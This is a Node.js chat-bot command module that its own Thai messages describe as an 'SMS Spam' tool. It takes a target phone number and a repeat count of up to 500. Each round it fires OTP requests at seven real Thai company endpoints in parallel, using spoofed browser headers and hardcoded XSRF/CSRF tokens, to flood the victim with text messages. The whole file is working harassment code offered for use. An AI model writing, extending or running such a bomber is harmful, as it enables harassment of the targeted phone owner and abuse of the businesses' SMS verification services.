const axios = require('axios');

module.exports = {
  config: {
    name: "sms",
    version: "1.1.0",
    description: "ส่ง SMS ผ่าน Multi-API (Enhanced)",
    usage: "/sms <เบอร์> <จำนวน>",
    aliases: ["fd888"],
  },
  run: async ({ api, event, args }) => {
    const { senderID } = event;

    try {
      if (args.length < 2) {
        return api.sendMessage(senderID, `
✨ **คำสั่งเทพ SMS Spam V2** ✨
❌ รูปแบบไม่ถูกต้อง!
📜 ใช้: /sms <เบอร์ 10 หลัก> <จำนวนครั้ง>
💡 ตัวอย่าง: /sms 0987456321 5
        `);
      }

      const phone = args[0];
      const count = parseInt(args[1]);

      if (!/^\d{10}$/.test(phone)) {
        return api.sendMessage(senderID, `
⚠️ **ERROR DETECTED** ⚠️
📞 เบอร์โทรต้องเป็นตัวเลข 10 หลักเท่านั้น!
💢 ตัวอย่าง: 0987456321
        `);
      }

      if (isNaN(count) || count < 1 || count > 500) {
        return api.sendMessage(senderID, `
⚠️ **INVALID COUNT** ⚠️
🔢 จำนวนครั้งต้องเป็นตัวเลขระหว่าง 1-500
        `);
      }

      await api.sendMessage(senderID, `
🔥 **เริ่มการสแปม SMS (Multi-API Enhanced)** 🔥
📞 เป้าหมาย: ${phone}
🎯 จำนวน: ${count} ครั้ง
⚡ ความเร็ว: เร็วสุด
👾 **ยิงโดย**: โทมัส V3 + Meoaw APIs
      `);

      let successCount = 0;
      for (let i = 0; i < count; i++) {
        try {
          // Original APIs
          const fd888Headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://fd888.org",
            "Referer": "https://fd888.org/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
          };
          const gb789Headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "th",
            "Content-Type": "application/json",
            "My-Domain": "gb-789.com",
            "Origin": "https://gb-789.com",
            "Referer": "https://gb-789.com/?action=register",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
          };

          // New Meoaw APIs
          const meoaw01Headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
          };
          
          const meoaw05Headers = {
            "x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA",
            "x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc",
            "content-type": "application/json;charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
          };

          // Execute all API calls in parallel
          const requests = [
            axios.post("https://service.fd888.org/api/user/request-otp", { phone }, { headers: fd888Headers }),
            axios.post("https://gb-789.com/api/tiamut/otp", { phone }, { headers: gb789Headers }),
            axios.post("https://www.carsome.co.th/website/login/sendSMS", { username: phone, optType: 0 }, { headers: meoaw01Headers }),
            axios.post("https://api-sso.ch3plus.com/user/request-otp", { tel: phone, type: "login" }, { headers: meoaw01Headers }),
            axios.post(`https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number=${phone}`, {}, { headers: meoaw01Headers }),
            axios.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", { username: phone }, { headers: meoaw01Headers }),
            axios.post("https://www.theconcert.com/rest/request-otp", {
              mobile: phone,
              country_code: "TH",
              lang: "th",
              channel: "sms",
              digit: 4
            }, { headers: meoaw05Headers })
          ];

          const responses = await Promise.allSettled(requests);
          successCount += responses.filter(r => r.status === "fulfilled" && r.value.status === 200).length;

        } catch (error) {
          console.error(`Error in iteration ${i}:`, error.message);
          continue;
        }
        await new Promise(resolve => setTimeout(resolve, 1000)); // 1 second delay between rounds
      }

      await api.sendMessage(senderID, `
✅ **ส่ง SMS เสร็จสิ้น!**
📞 เบอร์: ${phone}
📊 สำเร็จ: ${successCount}/${count * 7} ครั้ง
🚀 ยิงพร้อมกัน 7 API!
🔧 APIs: FD888, GB-789, Carsome, CH3Plus, True(v1), True(v2), TheConcert
      `);

    } catch (error) {
      console.error("❌ เกิดข้อผิดพลาด:", error.message);
      return api.sendMessage(senderID, `
💥 **SYSTEM FAILURE** 💥
❌ ไม่สามารถส่ง SMS ได้!
📢 เหตุผล: ${error.message}
⏲️ ลองใหม่ภายหลัง!
      `);
    }
  }
};
